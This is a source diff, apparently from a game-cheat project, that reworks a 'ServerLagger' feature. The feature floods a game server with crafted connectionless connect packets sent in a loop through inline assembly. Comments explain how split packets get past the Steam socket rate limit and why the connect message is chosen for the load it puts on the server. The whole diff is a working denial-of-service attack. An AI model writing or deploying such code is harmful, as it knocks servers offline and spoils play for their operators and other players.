@@ -524,17 +524,16 @@ namespace Features
 		// https://github.com/sieyconhay1001/Harpoon/blob/master/Harpoon/EngineHooks.cpp#L2135
 		void ServerLagger()
 		{
-			static int lagCounter = 0;
-
-			float flLagTime = Settings::Misc::ServerLagger::LagTime.GetFloat();
-			float flRestTime = Settings::Misc::ServerLagger::RestTime.GetFloat();
+			const float flLagTime = Settings::Misc::ServerLagger::LagTime.GetFloat();
+			const float flRestTime = Settings::Misc::ServerLagger::RestTime.GetFloat();
 			if (0.f < flLagTime && 0.f < flRestTime)
 			{
-				int lagLimit = TIME_TO_TICKS(flLagTime);
+				static int lagCounter = 0;
+				const int lagLimit = TIME_TO_TICKS(flLagTime);
 				if (lagLimit < lagCounter)
 				{
 					static int restCounter = 0;
-					int restLimit = TIME_TO_TICKS(flRestTime);
+					const int restLimit = TIME_TO_TICKS(flRestTime);
 					if (restLimit < restCounter)
 					{
 						lagCounter = 0;
@@ -546,49 +545,47 @@ namespace Features
 						return;
 					}
 				}
+				++lagCounter;
 			}
 
-			INetChannel* nc = I::EngineClient->GetNetChannelInfo();
-			if (!nc)
+			INetChannel* chan = I::EngineClient->GetNetChannelInfo();
+			if (!chan)
 				return;
 
-			static BYTE compressedRandom[MAX_ROUTABLE_PAYLOAD * 10] = { 0 };
-			if (!compressedRandom[0])
+			// valve uses MAX_ROUTABLE_PAYLOAD * 2 for size, but we don't need that much we only write 6 bytes
+			static BYTE data[12] = { 0 };
+			if (!data[0])
 			{
-				BYTE random[sizeof(compressedRandom)] = { 0 };
-				// randomize every second byte so compressor can compress
-				for (UINT i = 0; i < sizeof(random); i += 2)
-					random[i] = (BYTE)rand();
-
-				CLZSS compressor;
-				UINT compressedSize;
-				if (!compressor.CompressNoAlloc(random, sizeof(random), compressedRandom, &compressedSize))
-					return;
-
+				// https://github.com/perilouswithadollarsign/cstrike15_src/blob/master/engine/baseclientstate.cpp#L807
 				// bf_write doesn't copy but uses provided buffer
-				bf_write buf(compressedRandom, sizeof(compressedRandom));
+				bf_write buf(data, sizeof(data));
+				// I guess valve servers don't have CheckConnectionLessRateLimits check
+				// https://github.com/perilouswithadollarsign/cstrike15_src/blob/master/engine/baseserver.cpp#L903
 				buf.WriteLong(CONNECTIONLESS_HEADER);
+				// heaviest operation I assume
+				// https://github.com/perilouswithadollarsign/cstrike15_src/blob/master/engine/baseserver.cpp#L965
 				buf.WriteByte(C2S_CONNECT);
 				buf.WriteLong(I::EngineClient->GetEngineBuildNumber());
 			}
 
-			const UINT sendCount = Settings::Misc::ServerLagger::Strength.GetInt() * 45;
+			const BYTE* buf = data;
+			const int len = sizeof(data);
+			const int nMaxRoutableSize = chan->GetMaxRoutablePayloadSize();
 
+			const UINT sendCount = Settings::Misc::ServerLagger::Strength.GetInt() * 50;
 			for (UINT i = 0; i < sendCount; ++i)
 			{
-				BYTE* pCompressedRandom = compressedRandom;
-				int len = (sizeof(SPLITPACKET) + 1);
+				// NET_SendLong because we need to send split packets to bypass CSteamSocketMgr ratelimit
+				// https://github.com/perilouswithadollarsign/cstrike15_src/blob/master/engine/net_steamsocketmgr.cpp#L258
 				_asm {
-					mov ecx, nc
-					mov edx, pCompressedRandom
-					push MIN_USER_MAXROUTABLE_SIZE
+					mov ecx, chan
+					mov edx, buf
+					push nMaxRoutableSize
 					push len
 					call Signatures::NET_SendLong
 					add esp, 8
 				}
 			}
-
-			++lagCounter;
 		}
 	}
 }
